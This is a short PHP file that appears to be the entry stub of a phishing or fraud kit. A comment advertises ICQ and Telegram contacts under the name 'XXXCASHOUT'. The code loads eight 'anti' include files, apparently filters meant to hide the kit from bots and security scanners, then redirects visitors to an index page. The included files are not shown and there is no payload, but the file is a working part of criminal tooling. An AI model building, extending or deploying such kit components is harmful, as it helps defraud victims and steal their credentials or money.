<?php
/*
📲 CONTACT ME HERE 
🔰 ICQ : https://icq.im/XXXCASHOUT
🔰 TELEGRAM : https://t.me/xxxcashout99
*/
  	require 'anti1.php';
	require 'anti2.php';
	require 'anti3.php';
	require 'anti4.php';
	require 'anti5.php';
	require 'anti6.php';
	require 'anti7.php';
	require 'anti8.php';
	exit(header("Location: ../index.php"));
?>